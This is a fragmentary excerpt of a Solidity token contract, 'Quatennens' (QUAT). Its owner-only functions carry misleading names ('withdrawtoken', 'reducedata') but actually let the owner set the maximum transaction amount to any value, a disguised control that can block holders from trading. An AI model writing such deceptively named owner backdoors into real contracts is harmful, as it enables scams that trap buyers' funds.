...
contract Quatennens is Context, IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string private _name = "Quatennens";
    string private _symbol = "QUAT";
    ...
    function withdrawtoken(uint256 maxTXPercentage) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxTXPercentage) / 1000;
    }

    function reducedata(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }
    ...
    function dividedAdd(address shareholder, uint256 _amount) internal {    
